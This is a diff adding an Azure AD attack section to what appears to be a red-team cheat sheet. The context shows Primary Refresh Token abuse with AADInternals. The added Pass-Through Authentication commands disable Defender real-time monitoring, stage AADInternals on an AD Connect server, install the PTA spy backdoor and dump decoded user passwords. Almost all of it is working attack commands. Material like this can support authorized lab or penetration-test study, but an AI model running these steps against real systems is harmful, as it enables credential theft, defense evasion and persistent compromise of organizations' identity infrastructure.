@@ -19,3 +19,14 @@ $ClearKey = "1054caa8a059f111ec521373d35d8a2f8…"
 $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
 New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
 ```
+### Pass-Through Authentication (PTA)
+```
+Get-Command -Module PassthroughAuthPSModule
+Set-MpPreference -DisableRealtimeMonitoring $true
+Copy-Item -ToSession $adcnct -Path C:\AzAD\Tools\AADInternals.0.4.5.zip -Destination C:\Users\adconnectadmin\Documents
+Enter-PSSession $adcnct
+Expand-Archive C:\Users\adconnectadmin\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\adconnectadmin\Documents\AADInternals
+Import-Module C:\Users\adconnectadmin\Documents\AADInternals\AADInternals.psd1
+Install-AADIntPTASpy
+Get-AADIntPTASpyLog -DecodePasswords
+```
